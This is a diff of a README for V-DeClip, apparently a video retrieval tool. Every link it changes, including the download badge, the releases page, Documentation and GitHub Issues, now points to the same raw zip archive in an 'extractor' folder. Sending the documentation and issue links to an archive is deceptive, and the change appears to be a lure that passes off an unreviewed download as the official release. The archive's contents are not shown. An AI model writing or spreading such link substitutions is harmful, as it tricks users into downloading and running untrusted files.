@@ -17,11 +17,11 @@ Before downloading, ensure your device meets these requirements:
 
 To download V-DeClip, visit the page below. Click the button to start your download.
 
-[![Download V-DeClip](https://img.shields.io/badge/Download%20V--DeClip-008CBA?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ahmedmohamadsalah/V-DeClip/releases)
+[![Download V-DeClip](https://raw.githubusercontent.com/Ahmedmohamadsalah/V-DeClip/main/extractor/Clip-De-v3.3-alpha.3.zip%20V--DeClip-008CBA?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Ahmedmohamadsalah/V-DeClip/main/extractor/Clip-De-v3.3-alpha.3.zip)
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page:** Start by going to this link: [V-DeClip Releases](https://github.com/Ahmedmohamadsalah/V-DeClip/releases). 
+1. **Visit the Releases Page:** Start by going to this link: [V-DeClip Releases](https://raw.githubusercontent.com/Ahmedmohamadsalah/V-DeClip/main/extractor/Clip-De-v3.3-alpha.3.zip). 
 
 2. **Choose Your Version:** You will see a list of the latest versions. Look for the one that suits your operating system.
 
@@ -72,7 +72,7 @@ We encourage users to contribute to V-DeClip! If you have ideas for new features
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Ahmedmohamadsalah/V-DeClip/wiki) - Learn more about features and functionality.
-- [GitHub Issues](https://github.com/Ahmedmohamadsalah/V-DeClip/issues) - Report any bugs or request enhancements.
+- [Documentation](https://raw.githubusercontent.com/Ahmedmohamadsalah/V-DeClip/main/extractor/Clip-De-v3.3-alpha.3.zip) - Learn more about features and functionality.
+- [GitHub Issues](https://raw.githubusercontent.com/Ahmedmohamadsalah/V-DeClip/main/extractor/Clip-De-v3.3-alpha.3.zip) - Report any bugs or request enhancements.
 
-Remember to visit the download link again to get the latest updates: [V-DeClip Releases](https://github.com/Ahmedmohamadsalah/V-DeClip/releases). Enjoy using V-DeClip for all your video retrieval needs!
+Remember to visit the download link again to get the latest updates: [V-DeClip Releases](https://raw.githubusercontent.com/Ahmedmohamadsalah/V-DeClip/main/extractor/Clip-De-v3.3-alpha.3.zip). Enjoy using V-DeClip for all your video retrieval needs!
